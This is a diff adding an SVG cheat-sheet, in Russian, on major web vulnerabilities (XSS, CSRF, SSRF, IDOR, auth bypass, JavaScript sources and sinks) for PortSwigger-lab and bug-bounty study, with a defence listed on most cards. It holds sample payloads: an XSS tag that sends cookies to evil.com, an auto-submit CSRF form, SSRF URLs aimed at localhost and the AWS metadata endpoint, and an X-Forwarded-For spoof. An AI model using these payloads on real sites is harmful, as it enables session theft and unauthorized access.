@@ -1,0 +1,88 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 720" width="100%" height="100%" style="background-color: #0d1117; font-family: 'Segoe UI', Roboto, Arial, sans-serif;">
+  <rect x="30" y="25" width="1140" height="75" rx="14" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
+  <text x="55" y="60" font-size="24" font-weight="bold" fill="#f85149">💥 КАРТА ГЛАВНЫХ ВЕБ-УЯЗВИМОСТЕЙ (PORTSWIGGER LABS &amp; JS SINKS)</text>
+  <text x="55" y="84" font-size="14" fill="#8b949e">XSS • CSRF • SSRF • IDOR • Auth Bypass • Опасные функции JavaScript (Sources &amp; Sinks)</text>
+
+  <!-- Row 1: XSS, CSRF, SSRF -->
+  <g transform="translate(30, 120)">
+    <rect width="365" height="265" rx="14" fill="#161b22" stroke="#f85149" stroke-width="2"/>
+    <rect x="20" y="18" width="325" height="32" rx="6" fill="#da3633"/>
+    <text x="32" y="39" font-size="15" font-weight="bold" fill="#ffffff">1. XSS (Cross-Site Scripting)</text>
+    <text x="20" y="72" font-size="13" font-weight="bold" fill="#f0883e">Суть: Запуск твоего JS в браузере жертвы</text>
+    <text x="20" y="96" font-size="12" fill="#c9d1d9">• Reflected: скрипт отражается из URL-параметра</text>
+    <text x="20" y="116" font-size="12" fill="#c9d1d9">• Stored: скрипт сохранён в БД (в комментарии)</text>
+    <text x="20" y="136" font-size="12" fill="#c9d1d9">• DOM-based: ошибка внутри клиентского JS</text>
+    <rect x="20" y="152" width="325" height="55" rx="6" fill="#0d1117" stroke="#30363d"/>
+    <text x="30" y="175" font-family="monospace" font-size="11.5" fill="#7ee787">&lt;img src=x onerror=fetch('https://</text>
+    <text x="30" y="195" font-family="monospace" font-size="11.5" fill="#7ee787">evil.com/?c='+document.cookie)&gt;</text>
+    <text x="20" y="235" font-size="12" fill="#79c0ff">🛡️ Защита: Экранирование HTML + CSP + HttpOnly</text>
+  </g>
+
+  <g transform="translate(417, 120)">
+    <rect width="365" height="265" rx="14" fill="#161b22" stroke="#d29922" stroke-width="2"/>
+    <rect x="20" y="18" width="325" height="32" rx="6" fill="#d29922"/>
+    <text x="32" y="39" font-size="15" font-weight="bold" fill="#000000">2. CSRF (Подделка запроса)</text>
+    <text x="20" y="72" font-size="13" font-weight="bold" fill="#e3b341">Суть: Действие от имени жертвы без её ведома</text>
+    <text x="20" y="96" font-size="12" fill="#c9d1d9">Жертва заходит на сайт хакера, а он в фоне</text>
+    <text x="20" y="116" font-size="12" fill="#c9d1d9">шлёт запрос в банк: «Сменить почту / перевод».</text>
+    <text x="20" y="136" font-size="12" fill="#c9d1d9">Браузер САМ прикрепляет куки жертвы!</text>
+    <rect x="20" y="152" width="325" height="55" rx="6" fill="#0d1117" stroke="#30363d"/>
+    <text x="30" y="175" font-family="monospace" font-size="11.5" fill="#f0883e">&lt;form action="https://bank.com/email"</text>
+    <text x="30" y="195" font-family="monospace" font-size="11.5" fill="#f0883e">method="POST"&gt;...auto-submit!&lt;/form&gt;</text>
+    <text x="20" y="235" font-size="12" fill="#79c0ff">🛡️ Защита: CSRF-токен + SameSite=Strict/Lax</text>
+  </g>
+
+  <g transform="translate(805, 120)">
+    <rect width="365" height="265" rx="14" fill="#161b22" stroke="#8957e5" stroke-width="2"/>
+    <rect x="20" y="18" width="325" height="32" rx="6" fill="#8957e5"/>
+    <text x="32" y="39" font-size="15" font-weight="bold" fill="#ffffff">3. SSRF (Запрос от имени сервера)</text>
+    <text x="20" y="72" font-size="13" font-weight="bold" fill="#d2a8ff">Суть: Заставить сервер просканировать сеть</text>
+    <text x="20" y="96" font-size="12" fill="#c9d1d9">Сервер просят загрузить картинку по URL,</text>
+    <text x="20" y="116" font-size="12" fill="#c9d1d9">а хакер подсовывает внутренний адрес:</text>
+    <text x="20" y="136" font-size="12" fill="#c9d1d9">локальную админку или ключи облака AWS!</text>
+    <rect x="20" y="152" width="325" height="55" rx="6" fill="#0d1117" stroke="#30363d"/>
+    <text x="30" y="175" font-family="monospace" font-size="11.5" fill="#7ee787">url=http://127.0.0.1:8080/admin</text>
+    <text x="30" y="195" font-family="monospace" font-size="11.5" fill="#7ee787">url=http://169.254.169.254/latest/meta-data</text>
+    <text x="20" y="235" font-size="12" fill="#79c0ff">🛡️ Защита: Белый список доменов, запрет локальных IP</text>
+  </g>
+
+  <!-- Row 2: IDOR & Auth Bypass + JS Sources/Sinks -->
+  <g transform="translate(30, 410)">
+    <rect width="550" height="280" rx="14" fill="#161b22" stroke="#2ea043" stroke-width="2"/>
+    <rect x="20" y="18" width="510" height="32" rx="6" fill="#2ea043"/>
+    <text x="32" y="39" font-size="15" font-weight="bold" fill="#ffffff">4. IDOR, Бизнес-логика и Auth Bypass (Любимчики Bug Bounty)</text>
+    <text x="20" y="74" font-size="13" font-weight="bold" fill="#7ee787">• IDOR (Insecure Direct Object Reference):</text>
+    <text x="32" y="96" font-size="12.5" fill="#c9d1d9">Меняем /api/invoice?id=105 на id=104 ➔ читаем чужой чек или переписку!</text>
+    <text x="20" y="128" font-size="13" font-weight="bold" fill="#7ee787">• Нарушение бизнес-логики (Business Logic Flaws):</text>
+    <text x="32" y="150" font-size="12.5" fill="#c9d1d9">Отрицательное количество товара (-5 шт.), пропуск шага оплаты, гонка (Race Condition).</text>
+    <text x="20" y="182" font-size="13" font-weight="bold" fill="#7ee787">• Auth Bypass (Обход аутентификации):</text>
+    <text x="32" y="204" font-size="12.5" fill="#c9d1d9">Подмена заголовков (X-Forwarded-For: 127.0.0.1), смена метода POST на GET,</text>
+    <text x="32" y="224" font-size="12.5" fill="#c9d1d9">обход 2FA через прямой переход на /dashboard.</text>
+    <text x="20" y="258" font-size="12" font-weight="bold" fill="#f0883e">🎯 Не требуют сложных эксплойтов — только внимания и понимания логики!</text>
+  </g>
+
+  <g transform="translate(605, 410)">
+    <rect width="565" height="280" rx="14" fill="#161b22" stroke="#1f6feb" stroke-width="2"/>
+    <rect x="20" y="18" width="525" height="32" rx="6" fill="#1f6feb"/>
+    <text x="32" y="39" font-size="15" font-weight="bold" fill="#ffffff">5. АНАЛИЗ JAVASCRIPT: ИСТОЧНИКИ (SOURCES) ➔ СТОКИ (SINKS)</text>
+    <text x="20" y="72" font-size="12.5" fill="#c9d1d9">При анализе чужого JS-кода (в DevTools / Burp) ищем путь от ввода к опасной функции:</text>
+    
+    <rect x="20" y="90" width="245" height="165" rx="8" fill="#0d1117" stroke="#e3b341"/>
+    <text x="32" y="114" font-size="13" font-weight="bold" fill="#e3b341">📥 SOURCES (Откуда берёт ввод)</text>
+    <text x="32" y="138" font-family="monospace" font-size="12" fill="#c9d1d9">• location.search (?q=...)</text>
+    <text x="32" y="160" font-family="monospace" font-size="12" fill="#c9d1d9">• location.hash (#...)</text>
+    <text x="32" y="182" font-family="monospace" font-size="12" fill="#c9d1d9">• document.referrer</text>
+    <text x="32" y="204" font-family="monospace" font-size="12" fill="#c9d1d9">• window.name</text>
+    <text x="32" y="226" font-family="monospace" font-size="12" fill="#c9d1d9">• postMessage событиe</text>
+
+    <text x="275" y="175" font-size="22" fill="#f85149">➔</text>
+
+    <rect x="305" y="90" width="240" height="165" rx="8" fill="#0d1117" stroke="#f85149"/>
+    <text x="317" y="114" font-size="13" font-weight="bold" fill="#f85149">💥 SINKS (Опасные функции)</text>
+    <text x="317" y="138" font-family="monospace" font-size="12" fill="#f0883e">• element.innerHTML = ...</text>
+    <text x="317" y="160" font-family="monospace" font-size="12" fill="#f0883e">• document.write(...)</text>
+    <text x="317" y="182" font-family="monospace" font-size="12" fill="#f0883e">• eval(...) / setTimeout()</text>
+    <text x="317" y="204" font-family="monospace" font-size="12" fill="#f0883e">• location.href = ... (javascript:)</text>
+    <text x="317" y="226" font-family="monospace" font-size="12" fill="#7ee787">✔ Безопасно: textContent</text>
+  </g>
+</svg>
